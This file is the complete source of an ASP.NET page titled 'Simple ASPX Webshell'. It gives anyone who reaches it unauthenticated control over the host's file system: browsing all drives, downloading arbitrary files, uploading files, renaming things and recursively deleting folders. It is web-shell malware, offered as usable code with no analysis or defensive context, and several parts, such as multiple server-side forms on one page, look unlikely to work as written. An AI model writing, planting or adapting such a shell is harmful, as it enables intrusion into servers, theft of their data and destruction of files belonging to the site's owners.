<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">

string currentDir {
    get {
        if (ViewState["currentDir"] == null) {
            // Default to drives root
            return null;
        }
        return (string)ViewState["currentDir"];
    }
    set {
        ViewState["currentDir"] = value;
    }
}

protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
        currentDir = null; // Start at drives list
    }
}

protected void Navigate(string path)
{
    if (Directory.Exists(path))
    {
        currentDir = path;
    }
    else if (File.Exists(path))
    {
        // Serve file for download
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(path));
        Response.WriteFile(path);
        Response.End();
    }
}

protected void btnGoBack_Click(object sender, EventArgs e)
{
    if (!string.IsNullOrEmpty(currentDir))
    {
        var parent = Directory.GetParent(currentDir);
        if (parent != null)
            currentDir = parent.FullName;
        else
            currentDir = null; // Back to drives list
    }
}

protected void btnNavigate_Click(object sender, EventArgs e)
{
    string path = Request.Form["navigatePath"];
    Navigate(path);
}

protected void btnDelete_Click(object sender, EventArgs e)
{
    string path = Request.Form["deletePath"];
    try
    {
        if (Directory.Exists(path))
            Directory.Delete(path, true);
        else if (File.Exists(path))
            File.Delete(path);
        lblMessage.Text = "Deleted: " + path;
    }
    catch (Exception ex)
    {
        lblMessage.Text = "Error deleting: " + ex.Message;
    }
    Response.Redirect(Request.RawUrl);
}

protected void btnRename_Click(object sender, EventArgs e)
{
    string oldPath = Request.Form["oldPath"];
    string newName = Request.Form["newName"];
    try
    {
        string newPath = Path.Combine(Path.GetDirectoryName(oldPath), newName);
        if (Directory.Exists(oldPath))
            Directory.Move(oldPath, newPath);
        else if (File.Exists(oldPath))
            File.Move(oldPath, newPath);
        lblMessage.Text = "Renamed to: " + newName;
    }
    catch (Exception ex)
    {
        lblMessage.Text = "Error renaming: " + ex.Message;
    }
    Response.Redirect(Request.RawUrl);
}

protected void btnUpload_Click(object sender, EventArgs e)
{
    if (FileUpload1.HasFile)
    {
        try
        {
            string savePath = Path.Combine(currentDir ?? Path.GetPathRoot(Environment.SystemDirectory), FileUpload1.FileName);
            FileUpload1.SaveAs(savePath);
            lblMessage.Text = "Uploaded: " + FileUpload1.FileName;
        }
        catch (Exception ex)
        {
            lblMessage.Text = "Upload error: " + ex.Message;
        }
    }
    Response.Redirect(Request.RawUrl);
}

protected void btnCreateFolder_Click(object sender, EventArgs e)
{
    string folderName = Request.Form["newFolderName"];
    try
    {
        string newFolderPath = Path.Combine(currentDir ?? Path.GetPathRoot(Environment.SystemDirectory), folderName);
        Directory.CreateDirectory(newFolderPath);
        lblMessage.Text = "Folder created: " + folderName;
    }
    catch (Exception ex)
    {
        lblMessage.Text = "Error creating folder: " + ex.Message;
    }
    Response.Redirect(Request.RawUrl);
}

string GetDrivesHtml()
{
    var drives = DriveInfo.GetDrives();
    string html = "<h3>Drives:</h3><ul>";
    foreach (var d in drives)
    {
        html += $"<li><a href='?path={d.Name}' onclick='event.preventDefault();document.getElementById(\"navigatePath\").value = \"{d.Name}\"; document.getElementById(\"navigateForm\").submit();'>{d.Name}</a> - {d.DriveType}</li>";
    }
    html += "</ul>";
    return html;
}

string GetFolderHtml(string path)
{
    if (!Directory.Exists(path))
        return "Invalid directory";

    var di = new DirectoryInfo(path);
    var dirs = di.GetDirectories();
    var files = di.GetFiles();

    string html = $"<h3>Listing for {path}</h3><ul>";
    foreach (var d in dirs)
    {
        html += $"<li>[DIR] <a href='?path={d.FullName}' onclick='event.preventDefault();document.getElementById(\"navigatePath\").value = \"{d.FullName}\"; document.getElementById(\"navigateForm\").submit();'>{d.Name}</a> " +
                $"<button onclick='deleteItem(\"{d.FullName}\")'>Delete</button> " +
                $"<button onclick='renameItem(\"{d.FullName}\")'>Rename</button></li>";
    }
    foreach (var f in files)
    {
        html += $"<li>[FILE] <a href='?download={f.FullName}'>{f.Name}</a> " +
                $"<button onclick='deleteItem(\"{f.FullName}\")'>Delete</button> " +
                $"<button onclick='renameItem(\"{f.FullName}\")'>Rename</button></li>";
    }
    html += "</ul>";
    return html;
}

</script>

<html>
<head>
    <title>Simple ASPX Webshell</title>
    <script>
        function deleteItem(path) {
            if (confirm("Delete " + path + "?")) {
                document.getElementById("deletePath").value = path;
                document.getElementById("deleteForm").submit();
            }
        }
        function renameItem(oldPath) {
            var newName = prompt("Enter new name for " + oldPath);
            if (newName) {
                document.getElementById("oldPath").value = oldPath;
                document.getElementById("newName").value = newName;
                document.getElementById("renameForm").submit();
            }
        }
    </script>
</head>
<body>
    <h2>ASPX Webshell - Drives & Navigation</h2>
    <form id="navigateForm" method="post" runat="server" onsubmit="return false;">
        <input type="hidden" name="navigatePath" id="navigatePath" />
    </form>

    <form id="deleteForm" method="post" runat="server" onsubmit="return false;">
        <input type="hidden" name="deletePath" id="deletePath" />
        <asp:Button ID="btnDelete" runat="server" OnClick="btnDelete_Click" Style="display:none" />
    </form>

    <form id="renameForm" method="post" runat="server" onsubmit="return false;">
        <input type="hidden" name="oldPath" id="oldPath" />
        <input type="hidden" name="newName" id="newName" />
        <asp:Button ID="btnRename" runat="server" OnClick="btnRename_Click" Style="display:none" />
    </form>

    <form method="post" runat="server" enctype="multipart/form-data">
        <asp:FileUpload ID="FileUpload1" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload File" OnClick="btnUpload_Click" />
        <br />
        New Folder Name: <input type="text" name="newFolderName" />
        <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" />
        <br />
        <asp:Button ID="btnGoBack" runat="server" Text="Go Back" OnClick="btnGoBack_Click" />
    </form>

    <div style="color:red;">
        <asp:Label ID="lblMessage" runat="server" />
    </div>

    <div>
        <% if (string.IsNullOrEmpty(currentDir)) { %>
            <%= GetDrivesHtml() %>
        <% } else { %>
            <%= GetFolderHtml(currentDir) %>
        <% } %>
    </div>

</body>
</html>
